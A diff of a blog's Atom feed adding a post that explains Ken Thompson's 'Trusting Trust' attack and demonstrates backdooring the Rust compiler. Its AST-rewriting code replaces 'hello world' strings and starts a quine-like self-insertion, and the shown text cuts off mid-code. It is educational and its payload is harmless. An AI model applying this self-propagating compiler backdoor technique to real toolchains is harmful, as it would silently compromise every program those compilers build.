@@ -4,7 +4,7 @@
   <title><![CDATA[In Pursuit of Laziness]]></title>
   <link href="http://manishearth.github.io/atom.xml" rel="self"/>
   <link href="http://manishearth.github.io/"/>
-  <updated>2016-08-18T23:08:41+05:30</updated>
+  <updated>2016-12-02T12:10:52-08:00</updated>
   <id>http://manishearth.github.io/</id>
   <author>
     <name><![CDATA[Manish Goregaokar]]></name>
@@ -14,9 +14,767 @@
 
   
   <entry>
+    <title type="html"><![CDATA[Reflections on Rusting Trust]]></title>
+    <link href="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/"/>
+    <updated>2016-12-02T11:28:27-08:00</updated>
+    <id>http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust</id>
+    <content type="html"><![CDATA[<p>The Rust compiler is written in Rust. This is overall a pretty common practice in compiler
+development. This usually means that the process of building the compiler involves downloading a
+(typically) older version of the compiler.</p>
+
+<p>This also means that the compiler is vulnerable to what is colloquially known as the &ldquo;Trusting
+Trust&rdquo; attack, an attack described in <a href="https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf">Ken Thompson&rsquo;s acceptance speech for the 1983 Turing Award</a>.
+This kind of thing fascinates me, so I decided to try writing one myself. It&rsquo;s stuff like this which
+started my interest in compilers, and I hope this post can help get others interested the same way.</p>
+
+<p>To be clear, this isn&rsquo;t an indictment of Rust&rsquo;s security. Quite a few languages out there have
+popular self-hosted compilers (C, C++, Haskell, Scala, D, Go) and are vulnerable to this attack. For
+this attack to have any effect, one needs to be able to uniformly distribute this compiler, and
+there are roughly equivalent ways of doing the same level of damage with that kind of access.</p>
+
+<p>If you already know what a trusting trust attack is, you can skip the next section. If you just want
+to see the code, it&rsquo;s in the <a href="https://github.com/Manishearth/rust/tree/rusting-trust">trusting-trust branch</a> on my Rust fork, specifically
+<a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this code</a>.</p>
+
+<h2>The attack</h2>
+
+<p>The essence of the attack is this:</p>
+
+<p>An attacker can conceivably change a compiler such that it can detect a particular kind of application and
+make malicious changes to it. The example given in the talk was the UNIX <code>login</code> program &mdash; the attacker
+can tweak a compiler so as to detect that it is compiling the <code>login</code> program, and compile in a
+backdoor that lets it unconditionally accept a special password (created by the attacker) for any
+user, thereby giving the attacker access to all accounts on all systems that have <code>login</code> compiled
+by their modified compiler.</p>
+
+<p>However, this change would be detected in the source. If it was not included in the source, this
+change would disappear in the next release of the compiler, or when someone else compiles the
+compiler from source. Avoiding this attack is easily done by compiling your own compilers and not
+downloading untrusted binaries. This is good advice in general regarding untrusted binaries, and it
+equally applies here.</p>
+
+<p>To counter this, the attacker can go one step further. If they can tweak the compiler so as to
+backdoor <code>login</code>, they could also tweak the compiler so as to backdoor itself. The attacker needs to
+modify the compiler with a backdoor which detects when it is compiling the same compiler, and
+introduces <em>itself</em> into the compiler that it is compiling. On top of this it can also introduce
+backdoors into <code>login</code> or whatever other program the attacker is interested in.</p>
+
+<p>Now, in this case, even if the backdoor is removed from the source, <em>every compiler compiled using
+this backdoored compiler will be similarly backdoored</em>. So if this backdoored compiler somehow
+starts getting distributed, it will spread itself as it is used to compile more copies of itself
+(e.g. newer versions, etc). And it will be virtually undetectable &mdash; since the source doesn&rsquo;t
+need to be modified for it to work; just the non-human-readable binary.</p>
+
+<p>Of course, there are ways to protect against this. Ultimately, before a compiler for language X
+existed, that compiler had to be written in some other language Y. If you can track the sources back
+to that point you can bootstrap a working compiler from scratch and keep compiling newer compiler
+versions till you reach the present. This raises the question of whether or not Y&rsquo;s compiler is
+backdoored. While it sounds pretty unlikely that such a backdoor could be so robust as to work on
+two different compilers and stay put throughout the history of X, you can of course trace back Y
+back to other languages and so on till you find a compiler in assembly that you can verify<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>
+
+<h2>Backdooring Rust</h2>
+
+<p>Alright, so I want to backdoor my compiler. I first have to decide when in the pipeline the code
+that insert backdoors executes. The Rust compiler operates by taking source code, parsing it into a
+syntax tree (AST), transforming it into some intermediate representations (HIR and MIR), and feeding
+it to LLVM in the form of LLVM IR, after which LLVM does its thing and creates binaries. A backdoor
+can be inserted at any point in this stage. To me, it seems like it&rsquo;s easier to insert one into the
+AST, because it&rsquo;s easier to obtain AST from source, and this is important as we&rsquo;ll see soon. It also
+makes this attack less practically viable<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, which is nice since this is just a fun exercise and I
+don&rsquo;t actually want to backdoor the compiler.</p>
+
+<p>So the moment the compiler finishes parsing, my code will modify the AST to insert a backdoor.</p>
+
+<p>First, I&rsquo;ll try to write a simpler backdoor; one which doesn&rsquo;t affect the compiler but instead
+affects some programs. I shall write a backdoor that replaces occurrences of the string &ldquo;hello world&rdquo;
+with &ldquo;जगाला नमस्कार&rdquo;, a rough translation of the same in my native language.</p>
+
+<p>Now, in rustc, the <code>rustc_driver</code> crate is where the whole process of compiling is coordinated. In particular,
+<a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L546"><code>phase_2_configure_and_expand</code></a> is run right after parsing (which is <a href="https://github.com/rust-lang/rust/blob/1cabe2151299c63497abc3a20bd08c04c0cd32a3/src/librustc_driver/driver.rs#L485">phase 1</a>). Perfect.
+Within that function, the <code>krate</code> variable contains the parsed AST for the crate<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and we need to modify that.</p>
+
+<p>In this case, there&rsquo;s already machinery in <a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/"><code>syntax::fold</code></a> for mutating ASTs based on patterns. A
+<a href="http://manishearth.github.io/rust-internals-docs/syntax/fold/trait.Folder.html"><code>Folder</code></a> basically has the ability to walk the AST, producing a mirror AST, with modifications. For
+each kind of node, you get to specify a function which will produce a node to be used in its place.
+Most such functions will default to no-op (returning the same node).</p>
+
+<p>So I write the following <code>Folder</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// Understanding the minute details of this code isn&#39;t important; it is a bit complex</span>
+</span><span class='line'><span class="c1">// since the API used here isn&#39;t meant to be used this way. Focus on the comments.</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">fold</span><span class="o">::*</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ast</span><span class="o">::*</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">token</span><span class="o">::</span><span class="n">InternedString</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ptr</span><span class="o">::</span><span class="n">P</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// The trait contains default impls which we override for specific cases</span>
+</span><span class='line'>    <span class="k">impl</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// every time we come across an expression, run this function</span>
+</span><span class='line'>        <span class="c1">// on it and replace it with the produced expression in the tree</span>
+</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="o">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
+</span><span class='line'>            <span class="c1">// The peculiar `.map` pattern needs to be used here</span>
+</span><span class='line'>            <span class="c1">// because of the way AST nodes are stored in immutable</span>
+</span><span class='line'>            <span class="c1">// `P&lt;T&gt;` pointers. The AST is not typically mutated.</span>
+</span><span class='line'>            <span class="n">expr</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">expr</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                <span class="k">match</span> <span class="n">expr</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">ExprKind</span><span class="o">::</span><span class="n">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">l</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                            <span class="c1">// look for string literals</span>
+</span><span class='line'>                            <span class="k">if</span> <span class="kd">let</span> <span class="n">LitKind</span><span class="o">::</span><span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
+</span><span class='line'>                                <span class="c1">// replace their contents</span>
+</span><span class='line'>                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">&quot;hello world&quot;</span> <span class="p">{</span>
+</span><span class='line'>                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">InternedString</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;जगाला नमस्कार&quot;</span><span class="p">);</span>
+</span><span class='line'>                                <span class="p">}</span>
+</span><span class='line'>                            <span class="p">}</span>
+</span><span class='line'>                            <span class="n">l</span>
+</span><span class='line'>                        <span class="p">})</span>
+</span><span class='line'>                    <span class="p">}</span>
+</span><span class='line'>                    <span class="n">_</span> <span class="o">=&gt;</span> <span class="p">()</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="c1">// recurse down expression with the default fold</span>
+</span><span class='line'>                <span class="n">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
+</span><span class='line'>            <span class="p">})</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">mac</span><span class="o">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
+</span><span class='line'>            <span class="c1">// Folders are not typically supposed to operate on pre-macro-expansion ASTs</span>
+</span><span class='line'>            <span class="c1">// and will by default panic here. We must explicitly specify otherwise.</span>
+</span><span class='line'>            <span class="n">noop_fold_mac</span><span class="p">(</span><span class="n">mac</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// our entry point</span>
+</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="o">:</span> <span class="n">Crate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// make a folder, fold the crate with it</span>
+</span><span class='line'>        <span class="n">TrustFolder</span><span class="p">.</span><span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I invoke it by calling <code>let krate = trust::fold_crate(krate);</code> as the first line of <code>phase_2_configure_and_expand</code>.</p>
+
+<p>I create a stage 1 build<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> of rustc (<code>make rustc-stage1</code>). I&rsquo;ve already set up <code>rustup</code> to have a &ldquo;stage1&rdquo; toolchain
+pointing to this folder (<code>rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// test.rs</span>
+</span><span class='line'><span class="k">fn</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="s">&quot;hello world&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>rustup run stage1 rustc test.rs
+</span><span class='line'><span class="nv">$ </span>./test
+</span><span class='line'>जगाला नमस्कार
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note that I had the string on a separate line instead of directly doing <code>println!("hello world")</code>.
+This is because our backdoor isn&rsquo;t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
+<code>println!</code> is stored as a macro and the <code>"hello world"</code> is part of the macro token tree; and has not
+yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
+post-expansion, however.</p>
+
+<p>So far, so good. We have a compiler that tweaks &ldquo;hello world&rdquo; strings. Now, let&rsquo;s see if we can get
+it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
+should produce a compiler that is similarly backdoored (with the <code>trust</code> module and the
+<code>trust::fold_crate()</code> call).</p>
+
+<p>We need to tweak our folder so that it does two things:</p>
+
+<ul>
+<li>Inserts the <code>let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code>phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
+<li>Inserts the <code>trust</code> module</li>
+</ul>
+
+
+<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
+invoking the parser again and extracting the node). The latter is where it gets tricky. We can
+encode instructions for outputting the AST of the <code>trust</code> module, but these instructions themselves
+are within the same module, so the instructions for outputting <em>these</em> instructions need to be
+included, and so on. This clearly isn&rsquo;t viable.</p>
+
+<p>However, there&rsquo;s a way around this. It&rsquo;s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
+issues. The idea is to put the entire block of code in a string. We then construct the code for the
+module by doing something like</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;/* stringified contents of this module except for this line */&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="c1">// ..</span>
+</span><span class='line'>    <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(..)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// ..</span>
+</span><span class='line'>        <span class="c1">// this produces a string that is the same as the code for the module containing it</span>
+</span><span class='line'>        <span class="c1">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
+</span><span class='line'>        <span class="c1">// once to produce the code for the module</span>
+</span><span class='line'>        <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
+</span><span class='line'>        <span class="c1">// ..</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="c1">// ..</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With the code of the module entered in, this will look something like</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;</span>
+</span><span class='line'><span class="s">        // .. </span>
+</span><span class='line'><span class="s">        fn fold_mod(..) {</span>
+</span><span class='line'><span class="s">            // ..</span>
+</span><span class='line'><span class="s">            // this produces a string that is the same as the code for the module containing it</span>
+</span><span class='line'><span class="s">            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
+</span><span class='line'><span class="s">            // once to produce the code for the module</span>
+</span><span class='line'><span class="s">            let code_for_module = </span><span class="se">\&quot;</span><span class="s">mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\\\&quot;\&quot;</span><span class="s"> + SELF_STRING + </span><span class="se">\&quot;\\\&quot;</span><span class="s">;</span><span class="se">\&quot;</span><span class="s"> + SELF_STRING + </span><span class="se">\&quot;</span><span class="s">}</span><span class="se">\&quot;</span><span class="s">;</span>
+</span><span class='line'><span class="s">            insert_into_crate(code_for_module);</span>
+</span><span class='line'><span class="s">            // ..</span>
+</span><span class='line'><span class="s">        }</span>
+</span><span class='line'><span class="s">        // ..</span>
+</span><span class='line'><span class="s">    &quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// ..</span>
+</span><span class='line'>    <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(..)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// ..</span>
+</span><span class='line'>        <span class="c1">// this produces a string that is the same as the code for the module containing it</span>
+</span><span class='line'>        <span class="c1">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
+</span><span class='line'>        <span class="c1">// once to produce the code for the module</span>
+</span><span class='line'>        <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
+</span><span class='line'>        <span class="c1">// ..</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="c1">// ..</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So you have a string containing the contents of the module, except for itself. You build the code
+for the module by using the string twice &ndash; once to construct the code for the declaration of the
+string, and once to construct the code for the rest of the module. Now, by parsing this, you&rsquo;ll get
+the original AST!</p>
+
+<p>Let&rsquo;s try this step by step. Let&rsquo;s first see if injecting an arbitrary string (<code>use foo::bar::blah</code>)
+works, without worrying about this cyclical quineyness:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
+</span><span class='line'>    <span class="c1">// dummy string just to see if it gets injected</span>
+</span><span class='line'>    <span class="c1">// inserting the full code of this module has some practical concerns</span>
+</span><span class='line'>    <span class="c1">// about escaping which I&#39;ll address later</span>
+</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;use foo::bar::blah;&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">fold</span><span class="o">::*</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ast</span><span class="o">::*</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">parse_crate_from_source_str</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">token</span><span class="o">::</span><span class="n">InternedString</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ptr</span><span class="o">::</span><span class="n">P</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">util</span><span class="o">::</span><span class="n">move_map</span><span class="o">::</span><span class="n">MoveMap</span><span class="p">;</span>
+</span><span class='line'>    <span class="kn">use</span> <span class="n">rustc</span><span class="o">::</span><span class="n">session</span><span class="o">::</span><span class="n">Session</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// we need the session to be able to parse things. No biggie.</span>
+</span><span class='line'>        <span class="n">sess</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">Session</span><span class="p">,</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">impl</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="o">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
+</span><span class='line'>            <span class="n">expr</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">expr</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                <span class="k">match</span> <span class="n">expr</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">ExprKind</span><span class="o">::</span><span class="n">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">l</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                            <span class="k">if</span> <span class="kd">let</span> <span class="n">LitKind</span><span class="o">::</span><span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
